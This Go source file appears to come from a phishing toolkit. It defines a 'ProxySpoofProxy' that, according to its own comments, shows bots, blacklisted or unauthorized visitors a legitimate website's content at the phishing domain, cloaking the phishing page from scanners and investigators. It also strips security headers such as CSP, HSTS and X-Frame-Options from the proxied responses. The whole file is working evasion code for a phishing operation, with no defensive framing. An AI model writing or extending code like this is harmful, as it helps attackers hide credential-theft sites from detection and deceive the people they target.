package proxy

import (
	"net/http"
	"net/http/httputil"
	"net/url"
)

// ProxySpoofProxy transparently reverse-proxies a configured legitimate website.
// Used when a connection is classified as bot, blacklisted, or unauthorized.
// The visitor sees the spoofed site's content at the phishing domain with no redirect.
type ProxySpoofProxy struct {
	defaultTarget *url.URL
	rp            *httputil.ReverseProxy
}

// NewProxySpoofProxy constructs a ProxySpoofProxy using defaultSpoofURL as the fallback.
// If defaultSpoofURL is empty, requests are answered with a plain 200 OK.
func NewProxySpoofProxy(defaultSpoofURL string) *ProxySpoofProxy {
	if defaultSpoofURL == "" {
		return &ProxySpoofProxy{}
	}
	target, err := url.Parse(defaultSpoofURL)
	if err != nil {
		return &ProxySpoofProxy{}
	}
	rp := httputil.NewSingleHostReverseProxy(target)
	rp.ModifyResponse = stripSpoofResponseHeaders
	return &ProxySpoofProxy{defaultTarget: target, rp: rp}
}

// ServeHTTP serves the spoof response using the default configured target.
func (s *ProxySpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if s.rp == nil {
		w.WriteHeader(http.StatusOK)
		return
	}
	s.rp.ServeHTTP(w, r)
}

// ServeWithTarget uses a specific spoof URL rather than the configured default.
func (s *ProxySpoofProxy) ServeWithTarget(w http.ResponseWriter, r *http.Request, spoofURL string) {
	target, err := url.Parse(spoofURL)
	if err != nil {
		s.ServeHTTP(w, r)
		return
	}
	rp := httputil.NewSingleHostReverseProxy(target)
	rp.ModifyResponse = stripSpoofResponseHeaders
	rp.ServeHTTP(w, r)
}

func stripSpoofResponseHeaders(resp *http.Response) error {
	resp.Header.Del("Content-Security-Policy")
	resp.Header.Del("Content-Security-Policy-Report-Only")
	resp.Header.Del("Strict-Transport-Security")
	resp.Header.Del("X-Frame-Options")
	resp.Header.Del("X-Content-Type-Options")
	return nil
}

// Compile-time check: ProxySpoofProxy satisfies Spoofer.
var _ Spoofer = (*ProxySpoofProxy)(nil)
